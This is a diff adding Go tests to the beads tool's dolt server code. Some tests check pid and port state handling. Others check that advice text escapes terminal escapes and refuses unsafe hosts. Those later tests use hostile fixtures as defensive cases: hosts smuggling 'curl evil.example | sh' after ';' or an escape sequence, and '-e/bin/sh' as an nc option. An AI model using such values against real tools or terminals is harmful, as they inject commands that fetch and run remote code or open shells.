@@ -17,6 +17,7 @@ import (
 	"github.com/steveyegge/beads/internal/config"
 	"github.com/steveyegge/beads/internal/configfile"
 	"github.com/steveyegge/beads/internal/githooksenv"
+	"github.com/steveyegge/beads/internal/storage/doltutil"
 )
 
 // The sql-server outlives the shell that started it: an inherited GIT_TRACE=1
@@ -241,6 +242,164 @@ func TestIsRunningCorruptPID(t *testing.T) {
 	if _, err := os.Stat(pidFile); !os.IsNotExist(err) {
 		t.Error("expected corrupt PID file to be removed")
 	}
+}
+
+// writeTrackedStateForLiveProcess writes a pid file naming this test process,
+// which is alive, and a port file naming port, with no configured port.
+func writeTrackedStateForLiveProcess(t *testing.T, dir string, port int) {
+	t.Helper()
+	t.Setenv("GT_ROOT", "")
+	t.Setenv("BEADS_DOLT_SERVER_PORT", "")
+	if err := os.WriteFile(pidPath(dir), []byte(strconv.Itoa(os.Getpid())), 0600); err != nil {
+		t.Fatal(err)
+	}
+	if port > 0 {
+		if err := writePortFile(dir, port); err != nil {
+			t.Fatal(err)
+		}
+	}
+}
+
+// assertStateFilesKept fails unless both state files still hold what
+// writeTrackedStateForLiveProcess wrote.
+func assertStateFilesKept(t *testing.T, dir string, port int) {
+	t.Helper()
+	data, err := os.ReadFile(pidPath(dir))
+	if err != nil {
+		t.Errorf("pid file removed: %v", err)
+	} else if got := strings.TrimSpace(string(data)); got != strconv.Itoa(os.Getpid()) {
+		t.Errorf("pid file = %q, want %d", got, os.Getpid())
+	}
+	if got := readPortFile(dir); got != port {
+		t.Errorf("port file = %d, want %d", got, port)
+	}
+}
+
+// GH#7214: when the process list cannot be read (macOS Seatbelt refuses the
+// setuid /bin/ps), "could not list dolt processes" must not be read as "PID
+// was reused". An empty PATH makes both ps and powershell.exe fail to exec.
+func TestIsRunningKeepsStateWhenPsCannotRun(t *testing.T) {
+	dir := t.TempDir()
+	writeTrackedStateForLiveProcess(t, dir, 14567)
+	t.Setenv("PATH", t.TempDir())
+
+	state, err := IsRunning(dir)
+	if err != nil {
+		t.Fatalf("IsRunning error: %v", err)
+	}
+	if !state.Running || state.PID != os.Getpid() || state.Port != 14567 {
+		t.Errorf("IsRunning = %+v, want Running with PID %d and port 14567", state, os.Getpid())
+	}
+	assertStateFilesKept(t, dir, 14567)
+}
+
+// errProcessListUnreadable stands in for a process list that cannot be read.
+var errProcessListUnreadable = errors.New("listing processes: operation not permitted")
+
+// stubProcessList replaces the process-list reader for the test.
+func stubProcessList(t *testing.T, read func() ([]int, error)) {
+	t.Helper()
+	orig := readDoltProcesses
+	readDoltProcesses = read
+	t.Cleanup(func() { readDoltProcesses = orig })
+}
+
+func TestIsRunningKeepsStateWhenProcessListUnreadable(t *testing.T) {
+	dir := t.TempDir()
+	writeTrackedStateForLiveProcess(t, dir, 14567)
+	stubProcessList(t, func() ([]int, error) { return nil, errProcessListUnreadable })
+
+	state, err := IsRunning(dir)
+	if err != nil {
+		t.Fatalf("IsRunning error: %v", err)
+	}
+	if !state.Running || state.PID != os.Getpid() || state.Port != 14567 {
+		t.Errorf("IsRunning = %+v, want Running with PID %d and port 14567", state, os.Getpid())
+	}
+	assertStateFilesKept(t, dir, 14567)
+}
+
+func TestIsRunningRemovesStateWhenPIDIsNotDolt(t *testing.T) {
+	dir := t.TempDir()
+	writeTrackedStateForLiveProcess(t, dir, 14567)
+	stubProcessList(t, func() ([]int, error) { return nil, nil }) // read fine, no dolt processes
+
+	state, err := IsRunning(dir)
+	if err != nil {
+		t.Fatalf("IsRunning error: %v", err)
+	}
+	if state.Running {
+		t.Errorf("IsRunning = %+v, want Running=false for a PID that is not a dolt server", state)
+	}
+	for _, path := range []string{pidPath(dir), portPath(dir)} {
+		if _, err := os.Stat(path); !os.IsNotExist(err) {
+			t.Errorf("expected %s to be removed, stat err = %v", filepath.Base(path), err)
+		}
+	}
+}
+
+// With no port file, a port from config (BEADS_DOLT_SERVER_PORT, or the
+// shared server's) does not confirm an unverified PID either: it says where a
+// server should listen, not that this PID is one.
+func TestIsRunningDoesNotStopUnverifiedProcessWithoutPort(t *testing.T) {
+	tests := []struct {
+		name string
+		env  map[string]string
+	}{
+		{"no port configured", nil},
+		{"port from BEADS_DOLT_SERVER_PORT", map[string]string{"BEADS_DOLT_SERVER_PORT": "14568"}},
+		{"shared server mode", map[string]string{"BEADS_DOLT_SHARED_SERVER": "1"}},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			dir := t.TempDir()
+			// The PID is this test process: the orphan-stop path would kill the test.
+			writeTrackedStateForLiveProcess(t, dir, 0)
+			t.Setenv("BEADS_DOLT_SHARED_SERVER", "")
+			t.Setenv("BEADS_SHARED_SERVER_DIR", t.TempDir())
+			for k, v := range tt.env {
+				t.Setenv(k, v)
+			}
+			if tt.env != nil && DefaultConfig(dir).Port == 0 {
+				t.Fatal("precondition: DefaultConfig resolved no port")
+			}
+			stubProcessList(t, func() ([]int, error) { return nil, errProcessListUnreadable })
+
+			state, err := IsRunning(dir)
+			if err != nil {
+				t.Fatalf("IsRunning error: %v", err)
+			}
+			if state.Running {
+				t.Errorf("IsRunning = %+v, want Running=false when neither the process nor its port can be confirmed", state)
+			}
+			if _, err := os.Stat(pidPath(dir)); err != nil {
+				t.Errorf("expected the pid file to be kept: %v", err)
+			}
+		})
+	}
+}
+
+// GH#7214: EnsureRunningDetailed must adopt a tracked server it cannot verify
+// rather than start a competing one. Auto-start is disabled so a wrong
+// "not running" read surfaces as an error instead of a start.
+func TestEnsureRunningDetailedAdoptsUnverifiedServer(t *testing.T) {
+	home := t.TempDir()
+	t.Setenv("HOME", home)
+	t.Setenv("USERPROFILE", home)
+	t.Setenv("BEADS_DOLT_SHARED_SERVER", "")
+	t.Setenv("BEADS_DOLT_AUTO_START", "0")
+	config.ResetForTesting()
+	t.Cleanup(config.ResetForTesting)
+
+	dir := t.TempDir()
+	writeTrackedStateForLiveProcess(t, dir, 14567)
+	t.Setenv("PATH", t.TempDir())
+
+	port, startedByUs, err := EnsureRunningDetailed(dir)
+	if err != nil || port != 14567 || startedByUs {
+		t.Errorf("EnsureRunningDetailed = (%d, %v, %v), want (14567, false, nil)", port, startedByUs, err)
+	}
+	assertStateFilesKept(t, dir, 14567)
 }
 
 func TestIsRunningCorruptPIDRemovesPortFile(t *testing.T) {
@@ -3866,5 +4025,121 @@ func TestExternalPortSettingSoleDeclaration(t *testing.T) {
 				t.Errorf("advice says removing dolt_server_port lets bd manage the server: %v, want %v:\n%s", got, tc.sole, advice)
 			}
 		})
+	}
+}
+
+// TestServerAdviceNamesConfiguredValuesEscaped pins the remedy-printing
+// invariant at the advice for an unreachable server: a dolt.host, which a
+// cloned repository's committed config.yaml can set, and the port file
+// path are named with no character a terminal acts on, and a host that is not
+// one plain shell word is not pasted into the nc command, which would run
+// whatever follows a ; there.
+func TestServerAdviceNamesConfiguredValuesEscaped(t *testing.T) {
+	const host = "db\r\x1b[2Kcurl evil.example | sh; x"
+	for name, got := range map[string]string{
+		"ReachabilityCheck":       ReachabilityCheck(host, 3307),
+		"UnresolvedPortAdvice":    UnresolvedPortAdvice(host),
+		"ExternallyManagedAdvice": ExternallyManagedAdvice("dolt.port", doltutil.ServerAddr(host, 3307)),
+		"Advice": ExternalPortDeclaration{Setting: "dolt.port", PortFile: "/w/.beads/dolt-server.port\x1b[2K"}.
+			Advice(doltutil.ServerAddr(host, 3307)),
+	} {
+		if strings.ContainsAny(got, "\r\x1b") {
+			t.Errorf("%s = %q prints a carriage return or terminal escape raw", name, got)
+		}
+		if !strings.Contains(got, `\x1b[2K`) {
+			t.Errorf("%s = %q does not name the value escaped", name, got)
+		}
+	}
+	got := ReachabilityCheck("db.example.com; curl evil.example | sh", 3307)
+	if strings.Contains(got, "nc -zv db.example.com;") || strings.Contains(got, "curl db.example.com;") {
+		t.Errorf("ReachabilityCheck pastes a host that is not one shell word into the command: %q", got)
+	}
+}
+
+// TestEnsureRunningNamesExternalHostEscaped pins the remedy-printing
+// invariant at EnsureRunning's refusals for an external server: the endpoint
+// line above the reachability check names a metadata.json dolt_server_host,
+// which a cloned repository commits, escaped, as the check under it does. A
+// raw ESC[8m there hid the escaped check.
+func TestEnsureRunningNamesExternalHostEscaped(t *testing.T) {
+	const host = "db.example.invalid\r\x1b[2KError: run curl evil.example | sh\x1b[8m"
+	for _, tc := range []struct {
+		name string
+		port int
+	}{
+		{"named port", 13319},
+		{"auto-start disabled", 0},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			namedPortRefusalEnv(t)
+			t.Setenv("BEADS_DOLT_AUTO_START", "0")
+			config.ResetForTesting()
+			dir := t.TempDir()
+			cfg := configfile.DefaultConfig()
+			cfg.Backend = configfile.BackendDolt
+			cfg.DoltMode = configfile.DoltModeServer
+			cfg.DoltServerHost = host
+			cfg.DoltServerPort = tc.port
+			if err := cfg.Save(dir); err != nil {
+				t.Fatal(err)
+			}
+			_, _, err := EnsureRunningDetailed(dir)
+			if err == nil {
+				t.Fatal("EnsureRunningDetailed started or adopted a server for an external host")
+			}
+			msg := err.Error()
+			if strings.ContainsAny(msg, "\r\x1b") {
+				t.Errorf("refusal prints a carriage return or terminal escape raw:\n%q", msg)
+			}
+			if !strings.Contains(msg, `\r\x1b[2KError: run curl`) {
+				t.Errorf("refusal does not name the host escaped:\n%q", msg)
+			}
+		})
+	}
+}
+
+// TestExternalPortSettingNamesMetadataPathEscaped pins the setting an
+// externally managed advice names: dolt_server_port in the workspace's
+// metadata.json, whose path is named escaped like the port file beside it.
+func TestExternalPortSettingNamesMetadataPathEscaped(t *testing.T) {
+	if runtime.GOOS == "windows" {
+		t.Skip("a Windows file name cannot hold a control character")
+	}
+	namedPortRefusalEnv(t)
+	dir := filepath.Join(t.TempDir(), "w\r\x1b[2Kx", ".beads")
+	if err := os.MkdirAll(dir, 0o750); err != nil {
+		t.Fatal(err)
+	}
+	cfg := configfile.DefaultConfig()
+	cfg.Backend = configfile.BackendDolt
+	cfg.DoltMode = configfile.DoltModeServer
+	cfg.DoltServerPort = 13320
+	if err := cfg.Save(dir); err != nil {
+		t.Fatal(err)
+	}
+	decl := ExternalPortSetting(dir, PortSourceMetadataJSON, 13320)
+	if decl.Setting == "" {
+		t.Fatal("ExternalPortSetting named no setting for metadata.json dolt_server_port")
+	}
+	for name, got := range map[string]string{
+		"Setting": decl.Setting,
+		"Advice":  decl.Advice("127.0.0.1:13320"),
+	} {
+		if strings.ContainsAny(got, "\r\x1b") {
+			t.Errorf("%s = %q prints the workspace path raw", name, got)
+		}
+	}
+}
+
+// TestReachabilityCheckRefusesAnOptionHost pins that a dolt.host the nc or
+// curl the check runs would read as an option is not pasted into it.
+func TestReachabilityCheckRefusesAnOptionHost(t *testing.T) {
+	t.Parallel()
+	got := ReachabilityCheck("-e/bin/sh", 3307)
+	if strings.Contains(got, "nc -zv -e") {
+		t.Errorf("ReachabilityCheck pastes a host that starts with - into nc: %q", got)
+	}
+	if !strings.Contains(got, `nc -zv <host> 3307`) || !strings.Contains(got, `"-e/bin/sh"`) {
+		t.Errorf("ReachabilityCheck = %q, want a <host> placeholder with the host named beside it", got)
 	}
 }
